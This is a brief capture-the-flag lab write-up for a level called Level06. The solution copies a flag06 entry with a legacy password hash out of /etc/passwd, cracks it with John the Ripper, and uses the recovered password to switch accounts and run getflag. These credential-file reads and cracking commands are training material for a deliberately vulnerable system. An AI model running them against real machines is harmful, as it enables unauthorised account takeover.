# Level06

#### About

The flag06 account credentials came from a legacy unix system. 
To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06. 


#### Source code

There is no source code available for this level


#### Solutions

```
sed -n '37 p' /etc/passwd > /tmp/crack_pwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh

john crack_pwd   ----> password: hello
john --show crack_pwd

su flag06  <---- hello
/bin/getflag
```
